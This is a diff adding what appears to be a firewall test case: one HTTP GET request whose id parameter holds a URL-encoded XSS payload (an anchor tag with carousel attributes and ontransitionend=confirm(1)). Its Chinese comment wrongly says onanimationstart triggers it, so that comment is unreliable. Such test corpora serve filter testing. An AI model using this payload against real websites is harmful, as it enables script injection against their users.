@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件_a标签_ontransitionend事件-06506697
+# 攻击载荷利用了HTML中的a标签和onanimationstart属性，触发confirm()函数，显示一个提示框。动画开始的时候触发。
+GET /?id=%3Ca%20class=%22carousel%20slide%22%20data-ride=carousel%20data-interval=100%20ontransitionend=confirm%281%29%3E%3Cxss%20class=carousel-inner%3E%3Cxss%20class=%22carousel-item%20active%22%3E%3C%2Fxss%3E%3Cxss%20class=carousel-item%3E%3C%2Fxss%3E%3C%2Fxss%3E%3C%2Fxss%3E&bid=hd_tag_m8mv25ph HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25ph
+RM-PRO-Token: c3523a0369387eb568e629465ea52995
+RM-PRO-Time: 1742808498542
+User-Agent: curl/7.83.1
+
